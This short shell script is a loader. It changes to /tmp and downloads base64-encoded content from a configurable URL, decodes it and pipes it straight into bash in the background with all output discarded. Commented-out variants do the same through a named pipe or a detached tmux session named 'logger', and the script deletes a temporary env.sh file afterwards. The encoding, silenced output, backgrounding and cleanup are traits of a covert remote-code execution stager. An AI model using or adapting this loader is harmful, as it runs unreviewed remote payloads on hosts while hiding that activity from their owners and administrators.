#!/bin/sh

run_url="" ## the url of the script to run
cd /tmp
echo "export \

">env.sh
wget -qO- $run_url | base64 -d | bash &>/dev/null &
# mkfifo pull; wget -qO- $run_url | base64 -d > pull & bash < pull &>/dev/null &
# tmux new -d -s logger 'wget -qO- $run_url | base64 -d | bash'
sleep 3 && rm env.sh # &
wait %1